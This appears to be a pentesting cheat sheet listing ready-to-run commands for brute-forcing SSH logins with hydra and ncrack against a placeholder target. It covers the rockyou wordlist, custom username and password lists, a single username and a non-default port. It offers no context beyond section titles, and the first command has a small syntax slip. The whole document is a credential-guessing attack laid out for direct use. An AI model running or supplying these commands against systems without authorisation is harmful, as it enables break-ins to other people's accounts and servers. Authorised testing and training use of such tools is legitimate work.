
Using rockyou wordlist:
---
```bash
hydra -l $USER-P /usr/share/wordlists/rockyou.txt $TARGET_IP ssh -t 4 -V
```

```bash
hydra -l $USER -P /usr/share/wordlists/rockyou.txt -s $PORT ssh://$TARGET_IP
```
Using custom wordlist:
---
```bash
hydra -L usernames -P passwords $TARGET_IP ssh -t 4 -V
```

Brute force single username:
---
```bash
hydra -l USERNAME -P passwords $TARGET_IP ssh -t 4 -V
```

Using ncrack:
---
```bash
ncrack -u $TARGET_USER -P wordlist -v ssh://$TARGET_IP
```